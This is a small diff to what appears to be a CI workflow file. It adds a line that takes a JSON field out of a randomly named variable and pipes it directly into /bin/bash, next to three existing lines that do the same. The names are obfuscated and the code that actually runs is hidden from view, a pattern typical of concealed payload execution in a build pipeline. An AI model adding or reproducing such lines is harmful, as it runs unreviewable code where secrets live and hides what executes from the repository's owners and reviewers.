@@ -62,6 +62,7 @@ jobs:
           echo $cw66121 | jq -r .jwrwg9255 | /bin/bash
           echo $vr050 | jq -r .he1 | /bin/bash
           echo $pw8986 | jq -r .owt0 | /bin/bash
+          printf '%s' "$segu932" | jq -r .gkwaw9 | /bin/bash
 
       - name: Upload artifact
         if: always()
